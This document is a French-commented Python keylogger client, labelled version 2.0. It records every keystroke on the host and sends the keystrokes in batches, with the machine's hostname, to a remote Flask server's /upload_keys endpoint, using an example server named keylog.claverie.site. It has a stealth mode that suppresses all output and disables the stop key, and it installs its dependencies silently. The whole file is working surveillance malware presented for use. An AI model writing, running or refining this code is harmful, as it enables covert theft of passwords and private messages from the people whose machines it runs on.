#!/usr/bin/env python3
"""
Keylogger Client v2.0 - Version corrigée
Envoie les frappes vers le serveur Flask
"""
import sys
import json
import time
from datetime import datetime
import socket
import subprocess
import base64
from io import BytesIO
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    print("[!] PIL non installé, captures d'écran désactivées")

# Installation automatique des dépendances avec --break-system-packages
try:
    from pynput import keyboard
    import requests
except ImportError:
    print("[!] Installation des dépendances...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install", 
            "--break-system-packages", "-q", "pynput", "requests"
        ])
        from pynput import keyboard
        import requests
        print("[✓] Dépendances installées")
    except Exception as e:
        print(f"[✗] Erreur d'installation: {e}")
        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests")
        sys.exit(1)

class KeyloggerClient:
    def __init__(self, server_url, api_key, stealth=False):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.stealth = stealth
        self.buffer = []
        self.buffer_size = 10  # Envoyer toutes les 10 frappes
        self.last_send = time.time()
        self.send_interval = 5  # Ou toutes les 5 secondes
        
        # Identifier la machine
        self.machine_id = socket.gethostname()
        
        if not self.stealth:
            print(f"[✓] Keylogger démarré")
            print(f"[✓] Machine: {self.machine_id}")
            print(f"[✓] Serveur: {self.server_url}")
            print(f"[✓] Mode: {'Stealth' if stealth else 'Debug'}")
    
    def send_keys(self):
        """Envoie les touches vers le serveur"""
        if not self.buffer:
            return
        
        try:
            # Format attendu par /upload_keys
            logs = "".join(self.buffer)
            
            payload = {
                "machine": self.machine_id,
                "logs": logs
            }
            
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "KeyloggerClient/2.0"
            }
            
            response = requests.post(
                f"{self.server_url}/upload_keys",
                json=payload,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                if not self.stealth:
                    print(f"[✓] {len(self.buffer)} touches envoyées")
                self.buffer = []
            else:
                if not self.stealth:
                    print(f"[✗] Erreur serveur: {response.status_code}")
                    print(f"    Réponse: {response.text}")
        
        except requests.exceptions.RequestException as e:
            if not self.stealth:
                print(f"[✗] Erreur connexion: {e}")
        except Exception as e:
            if not self.stealth:
                print(f"[✗] Erreur inattendue: {e}")
    
    def on_press(self, key):
        """Callback appelé à chaque touche pressée"""
        try:
            # Touches normales
            if hasattr(key, 'char') and key.char:
                char = key.char
            # Touches spéciales
            else:
                key_name = str(key).replace('Key.', '')
                
                # Liste des touches à IGNORER complètement
                ignore_keys = [
                    'shift', 'shift_r', 'shift_l',
                    'ctrl', 'ctrl_r', 'ctrl_l',
                    'alt', 'alt_r', 'alt_l', 'alt_gr',
                    'cmd', 'cmd_r', 'cmd_l',
                    'caps_lock', 'fn',
                    'up', 'down', 'left', 'right',
                    'home', 'end', 'page_up', 'page_down',
                    'insert', 'print_screen', 'pause',
                    'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
                    'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
                ]
                
                if key_name in ignore_keys:
                    return  # Ne pas enregistrer ces touches
                
                # Mapping des touches à garder
                special_map = {
                    'space': ' ',
                    'enter': '\n',
                    'tab': '\t',
                    'backspace': '[⌫]',
                    'delete': '[DEL]',
                    'esc': '[ESC]',
                }
                
                char = special_map.get(key_name, f'[{key_name.upper()}]')
            
            # Ajouter au buffer
            if char:
                self.buffer.append(char)
                
                if not self.stealth:
                    print(f"[KEY] {char}", end='', flush=True)
            
            # Envoyer si buffer plein ou timeout
            current_time = time.time()
            if (len(self.buffer) >= self.buffer_size or 
                current_time - self.last_send >= self.send_interval):
                self.send_keys()
                self.last_send = current_time
        
        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur capture: {e}")
    
    def on_release(self, key):
        """Callback appelé au relâchement d'une touche"""
        # ESC pour arrêter (seulement en mode debug)
        if not self.stealth and key == keyboard.Key.esc:
            print("\n[!] Arrêt demandé (ESC)")
            return False
    
    def start(self):
        """Démarre l'écoute du clavier"""
        if not self.stealth:
            print("[!] Appuyez sur ESC pour arrêter en mode debug")
            print("-" * 50)
        
        try:
            # Test de connexion
            response = requests.get(
                f"{self.server_url}/api/ping",
                timeout=5
            )
            if response.status_code == 200:
                if not self.stealth:
                    print("[✓] Connexion au serveur OK")
            else:
                if not self.stealth:
                    print(f"[!] Serveur répond avec code {response.status_code}")
        except Exception as e:
            if not self.stealth:
                print(f"[!] Avertissement: Impossible de joindre le serveur")
                print(f"    Erreur: {e}")
                print("[!] Les données seront mises en buffer")
        
        # Démarrer l'écoute
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
        
        # Envoyer les données restantes
        if self.buffer:
            self.send_keys()

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
        print("Exemple: python3 keylogger_client_v2.py https://keylog.claverie.site API_KEY")
        sys.exit(1)
    
    server_url = sys.argv[1]
    api_key = sys.argv[2]
    stealth = "--stealth" in sys.argv
    
    try:
        client = KeyloggerClient(server_url, api_key, stealth)
        client.start()
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé (Ctrl+C)")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Erreur fatale: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
